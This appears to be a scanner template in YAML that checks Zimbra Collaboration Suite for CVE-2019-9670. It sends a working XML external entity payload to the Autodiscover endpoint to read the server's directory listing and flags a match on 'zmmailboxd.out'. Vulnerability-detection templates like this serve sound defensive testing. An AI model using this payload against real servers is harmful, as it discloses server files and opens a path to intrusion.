id: yaml-poc-synacor-zimbra_collaboration_suite-logical-CVE-2019-9670
info:
  name: Yaml Poc Synacor Zimbra_Collaboration_Suite Logical Cve 2019 9670
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-synacor-zimbra_collaboration_suite-logical-CVE-2019-9670'
  tags: cve
  classification:
    cve-id: CVE-2019-9670
  reference:
  - http/zimbra_xxe_rce
  - http://packetstormsecurity.com/files/152487/Zimbra-Collaboration-Autodiscover-Servlet-XXE-ProxyServlet-SSRF.html
  - http://www.rapid7.com/db/modules/exploit/linux/
  - http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce
  - https://bugzilla.zimbra.com/show_bug.cgi?id=109129
http:
- method: POST
  path:
  - /Autodiscover/Autodiscover.xml
  body: <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./" >]><Autodiscover
    xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>
  headers:
    Content-Type: text/xml
  redirects: false
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - zmmailboxd.out
    - Requested response schema not available
